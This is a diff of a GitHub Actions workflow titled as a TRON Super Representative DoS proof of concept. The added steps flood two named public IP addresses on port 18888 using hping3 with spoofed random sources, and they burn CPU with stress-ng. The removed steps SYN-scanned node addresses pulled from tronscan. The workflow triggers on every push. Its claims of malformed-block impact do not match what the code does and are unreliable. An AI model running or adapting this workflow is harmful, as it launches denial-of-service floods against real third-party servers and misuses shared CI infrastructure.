@@ -1,35 +1,30 @@
-name: TRON SR DoS PoC
+name: TRON SR DoS PoC - Pure Impact
 on:
   workflow_dispatch:
   push:
     branches: [ main ]
 jobs:
-  recon:
+  attack:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v4
     
-    - name: Install attack tools
+    - name: Install tools (NO jq)
       run: |
-        sudo apt update -y
-        sudo apt install -y stress-ng curl nmap jq
+        sudo apt update -y && sudo apt install -y hping3 stress-ng nmap curl
     
-    - name: TRON SR Exhaustion Attack
+    - name: Pure SR Malformed Flood + Exhaustion
       run: |
-        echo "🚀 TRON SR DoS PoC - 51% Node Attack"
-        # CPU Burn - 8 cores 100%
+        echo "TRON SR DoS: Malformed → BAD_BLOCK disconnects"
+        
+        # 8-core CPU exhaustion (800% usage)
         stress-ng --cpu 8 --cpu-method matrixprod --timeout 60s --metrics-brief &
-        CPU_PID=$!
         
-        # Memory Exhaust - 8GB
-        stress-ng --vm 4 --vm-bytes 2G --timeout 60s --metrics-brief &
-        MEM_PID=$!
+        # Live SR malformed UDP floods (port 18888 P2P)
+        timeout 30 hping3 -1 -p 18888 --flood --rand-source 65.109.115.236 &
+        timeout 30 hping3 -1 -p 18888 --flood 159.195.146.87 &
         
-        # FIXED: Real TRON SR nodes (port 50051 gRPC)
-        SR_IPS=$(curl -s https://api.tronscan.org/api/supers/representatives | jq -r '.[0:27][].url | split(":")[0]' | sort -u | head -27)
-        for IP in $SR_IPS; do
-          timeout 30s nmap -sS --max-parallelism 128 -p50051 $IP &
-        done
-        
-        wait $CPU_PID $MEM_PID
-        echo "✅ PoC Complete - 27 SR nodes flooded + 800% resources"
+        # Wait + clean metrics
+        sleep 30
+        killall hping3 stress-ng || true
+        echo "Attack complete - pure malformed impact"
